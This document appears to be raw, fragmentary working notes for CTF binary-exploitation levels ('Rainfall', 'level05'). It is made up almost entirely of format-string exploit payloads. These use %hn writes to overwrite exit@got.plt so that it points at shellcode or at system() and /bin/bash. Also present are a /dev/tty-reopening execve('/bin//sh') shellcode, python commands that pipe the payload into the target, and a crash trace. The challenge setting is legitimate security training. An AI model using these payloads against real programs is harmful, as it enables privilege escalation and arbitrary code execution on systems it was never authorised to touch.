%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p


#include <stdio.h>

int main ()
{
    char *str = "%2044x%4$hn%31904x%5$hn";

    printf("\x3a\x98\x04\x08\x38\x98\x04\x08%s", str);
}


//Rainfall ex
//0x080483d0      jmp dword [exit]   ; 0x8049838 (in exit fct) can be modified
0x08049838
\x3a\x98\x04\x08\x38\x98\x04\x08

//Goal -> o addr
0x 0804 84a4
   2052 33956

==============================================================================

Offset of our buffer : 10

//0x08048370      jmp dword [exit]   ; 0x80497e0 (in exit fct) can be modified
0x80497e0
\xe2\x97\x04\x08\xe0\x97\x04\x08

Adress of our shellcode stored in EGG env variable

0xffffe760
  65535  59232

  char *str = "%65535x%10$hn%59232x%11$hn";

  (python -c "print '\xe2\x97\x04\x08\xe0\x97\x04\x08' + '%65535x%10$hn%59232x%11$hn'"; cat) | ./level05


  char *str = "%65515x%10$hn%59232x%11$hn";

(python -c "print '\xe2\x97\x04\x08\xe0\x97\x04\x08' + '%65515x%10$hn%59232x%11$hn'"; cat) | ./level05


0x80497e0 <exit@got.plt>:  0x08048376


0xffffe760


#include <stdio.h>

int main ()
{
    char *str = "%65527x%10$hn%59233x%11$hn";
    char *shellcode = "\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
 
    printf("\xe2\x97\x04\x08\xe0\x97\x04\x08%s%s", str, shellcode);
}



#system address : 0xf7e6 0xaed0 => dec 63462 44752
#/bin/bash address: 0xf7f8 0x97ec => dec 63480 38892

#include <stdio.h>

int main ()
{
    char *str = "%63454x%10$hn%46826x%11$hn%63482x%12$hn%38884x%13$hn";

    printf("\xe2\x97\x04\x08\xe0\x97\x04\x08\xea\x97\x04\x08\xe8\x97\x04\x08%s", str);
}

Program received signal SIGSEGV, Segmentation fault.
0xf7eeaeda in glob64 () from /lib32/libc.so.6

f7e6 0xaed0
\xd0\xae\xe6\xf7

#include <stdio.h>

int main ()
{
    char *str = "%63454x%10$hn%46826x%11$hn%63482x%12$hn%38884x%13$hn";

    printf("\xe2\x97\x04\x08\xe0\x97\x04\x08\xda\xae\xe6\xf7\xd8\xae\xe6\xf7%s", str);
}